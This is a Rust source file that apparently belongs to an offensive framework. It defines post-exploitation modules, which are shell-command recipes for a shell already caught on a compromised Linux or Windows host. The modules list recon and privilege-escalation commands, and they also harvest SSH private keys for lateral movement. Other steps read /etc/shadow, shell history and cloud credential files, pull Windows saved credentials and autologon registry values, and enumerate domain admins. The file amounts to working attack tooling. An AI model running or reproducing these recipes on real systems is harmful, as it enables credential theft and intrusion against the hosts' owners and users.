//! Named session post-modules (research/FRAMEWORK.md §4): ordered shell-command
//! recipes piped through a caught raw shell, MSF-post-module style but tool-free.

use super::postex::Os;

pub struct Module {
    pub name: &'static str,
    pub os: Option<Os>, // None = any
    pub desc: &'static str,
    pub mitre: &'static [&'static str],
    /// (label, command) pairs, run in order.
    pub steps: &'static [(&'static str, &'static str)],
}

pub static MODULES: &[Module] = &[
    Module {
        name: "linux-quick-recon",
        os: Some(Os::Linux),
        desc: "Who/where am I: user, host, network, sudo.",
        mitre: &["T1082", "T1033", "T1016"],
        steps: &[
            ("whoami", "id; hostname; who"),
            ("os", "uname -a; cat /etc/os-release 2>/dev/null"),
            ("net", "ip -o addr 2>/dev/null || ifconfig -a 2>/dev/null; ip route 2>/dev/null"),
            ("sudo", "sudo -n -l 2>/dev/null"),
        ],
    },
    Module {
        name: "linux-priv-check",
        os: Some(Os::Linux),
        desc: "Local privesc surface: sudo, SUID, caps, cron, writable paths.",
        mitre: &["T1548", "T1069"],
        steps: &[
            ("sudo", "sudo -n -l 2>/dev/null; cat /etc/sudoers 2>/dev/null"),
            ("suid", "find / -perm -4000 -type f 2>/dev/null"),
            ("caps", "getcap -r / 2>/dev/null"),
            ("cron", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null; crontab -l 2>/dev/null"),
            ("writable", "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys' | head -40"),
            ("kernel", "uname -r; cat /proc/version"),
        ],
    },
    Module {
        name: "harvest-ssh-keys",
        os: Some(Os::Linux),
        desc: "Pull SSH private keys, authorized_keys and known_hosts for lateral movement.",
        mitre: &["T1552.004"],
        steps: &[
            ("private", "for d in /home/* /root; do echo \"== $d ==\"; cat $d/.ssh/id_* 2>/dev/null; done"),
            ("authorized", "for d in /home/* /root; do cat $d/.ssh/authorized_keys 2>/dev/null; done"),
            ("known", "for d in /home/* /root; do cat $d/.ssh/known_hosts 2>/dev/null; done"),
        ],
    },
    Module {
        name: "linux-cred-hunt",
        os: Some(Os::Linux),
        desc: "Hunt credentials in files, history, env and cloud config.",
        mitre: &["T1552.001", "T1552.002"],
        steps: &[
            ("shadow", "cat /etc/shadow 2>/dev/null"),
            ("history", "cat ~/.bash_history /home/*/.bash_history 2>/dev/null | tail -80"),
            ("configs", "grep -rEi 'password|passwd|secret|api[_-]?key' /var/www /etc /opt 2>/dev/null | head -40"),
            ("cloud", "cat ~/.aws/credentials ~/.config/gcloud/*.json /root/.aws/credentials 2>/dev/null"),
        ],
    },
    Module {
        name: "windows-priv-check",
        os: Some(Os::Windows),
        desc: "Windows privesc surface: privileges, groups, patches, services.",
        mitre: &["T1082", "T1069", "T1518"],
        steps: &[
            ("whoami", "whoami /all"),
            ("patches", "wmic qfe get HotFixID,InstalledOn 2>nul"),
            ("services", "wmic service get name,pathname,startmode 2>nul | findstr /i /v \"C:\\Windows\""),
            ("tasks", "schtasks /query /fo LIST /v 2>nul | findstr /i \"taskname task to run\""),
        ],
    },
    Module {
        name: "windows-cred-hunt",
        os: Some(Os::Windows),
        desc: "Windows credential hunt: cmdkey, saved creds, unattend, registry.",
        mitre: &["T1552.001", "T1555"],
        steps: &[
            ("cmdkey", "cmdkey /list"),
            ("unattend", "type C:\\Windows\\Panther\\Unattend.xml 2>nul & type C:\\Windows\\Panther\\Unattended.xml 2>nul"),
            ("autologon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul"),
            ("files", "findstr /si password *.txt *.ini *.config *.xml 2>nul"),
        ],
    },
    Module {
        name: "windows-domain-recon",
        os: Some(Os::Windows),
        desc: "Domain situational awareness from a Windows shell.",
        mitre: &["T1087.002", "T1482", "T1018"],
        steps: &[
            ("domain", "echo %USERDOMAIN% %LOGONSERVER%; nltest /dclist: 2>nul"),
            ("users", "net user /domain 2>nul"),
            ("admins", "net group \"Domain Admins\" /domain 2>nul"),
            ("computers", "net group \"Domain Computers\" /domain 2>nul | more"),
        ],
    },
];

pub fn by_name(name: &str) -> Option<&'static Module> {
    MODULES.iter().find(|m| m.name.eq_ignore_ascii_case(name))
}
